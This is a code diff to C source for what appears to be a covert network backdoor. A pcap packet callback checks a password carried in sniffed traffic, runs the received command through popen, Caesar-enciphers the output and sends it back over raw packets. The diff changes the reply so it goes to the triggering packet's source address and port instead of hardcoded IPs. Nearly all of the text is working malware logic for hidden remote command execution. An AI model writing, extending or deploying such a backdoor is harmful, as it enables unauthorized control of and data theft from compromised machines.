@@ -132,7 +132,7 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	if(mode == SERVER_MODE && (strcmp(password, PASSWORD) == 0))
 	{
 		fprintf(stderr, "Password Authenticated. Executing command.\n");
-		send_command(command, ip, 8080);
+		send_command(command, ip, ntohs(tcp->th_sport));
 		free(command);
 		return;
 	}
@@ -176,6 +176,12 @@ int send_command(char * command, const struct ip_struct * ip, const int dest_por
 	char cmd_results[PKT_SIZE];
 	char packet[PKT_SIZE];
 	char encrypted[PKT_SIZE];
+	char src[BUFFER];
+	char dst[BUFFER];
+
+	strcpy(src, inet_ntoa(ip->ip_dst));
+	strcpy(dst, inet_ntoa(ip->ip_src));
+
 	if((fp = popen(command, "r")) == NULL)
 	{
 		fprintf(stderr, "Cannot process command.\n");
@@ -190,11 +196,17 @@ int send_command(char * command, const struct ip_struct * ip, const int dest_por
 		strcpy(encrypted, ConvertCaesar(mEncipher, packet, MOD, START));
 		
 		//Send it over to the client
-		send_packet(encrypted, "192.168.0.2", "192.168.0.1", dest_port);
+		send_packet(encrypted, src, dst, dest_port);
 		
 		memset(encrypted, 0, sizeof(encrypted));
 		memset(packet, 0, sizeof(packet));
 		memset(cmd_results, 0, sizeof(cmd_results));
 	}
+
+	memset(encrypted, 0, sizeof(encrypted));
+	memset(packet, 0, sizeof(packet));
+	memset(cmd_results, 0, sizeof(cmd_results));
+	memset(src, 0, sizeof(src));
+	memset(dst, 0, sizeof(dst));
 	return 0;
 }
